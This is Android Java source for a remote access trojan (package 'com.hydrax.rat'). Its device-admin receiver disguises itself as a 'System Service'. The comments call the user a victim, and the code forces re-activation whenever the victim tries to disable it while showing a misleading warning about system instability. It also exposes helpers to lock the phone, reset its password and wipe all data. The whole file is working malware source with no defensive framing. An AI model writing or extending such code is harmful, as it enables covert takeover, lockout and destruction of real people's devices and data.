package com.hydrax.rat;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.widget.Toast;

public class HydraAdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        // Device Admin baru saja diaktifkan
        Toast.makeText(context, "System Service activated", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // Korban mencoba menonaktifkan Device Admin
        // AKTIFKAN KEMBALI SECARA PAKSA
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, HydraAdminReceiver.class);
            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                // Coba aktifkan ulang
                Intent reactivateIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                reactivateIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                reactivateIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "System Service required for device security");
                reactivateIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(reactivateIntent);
            }
        } catch (Exception e) {
            // Fallback: tampilkan toast
            Toast.makeText(context, "Cannot disable System Service", Toast.LENGTH_LONG).show();
        }
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        // Password device berubah
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        // Percobaan unlock gagal
    }

    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        // Unlock berhasil
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // Munculkan pesan saat korban mencoba disable
        return "System Service is required for device security. Disabling may cause system instability.";
    }

    @Override
    public void onLockTaskModeEntering(Context context, Intent intent, String pkg) {
        // Device masuk lock task mode
    }

    @Override
    public void onLockTaskModeExiting(Context context, Intent intent) {
        // Device keluar lock task mode
    }

    // ==================== FITUR TAMBAHAN ====================

    public static void lockDevice(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context, HydraAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.lockNow();
        }
    }

    public static void wipeDevice(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context, HydraAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.wipeData(0);
        }
    }

    public static void resetPassword(Context context, String newPassword) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context, HydraAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.resetPassword(newPassword, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
        }
    }

    public static boolean isAdminActive(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context, HydraAdminReceiver.class);
        return dpm != null && dpm.isAdminActive(adminComponent);
    }
    }
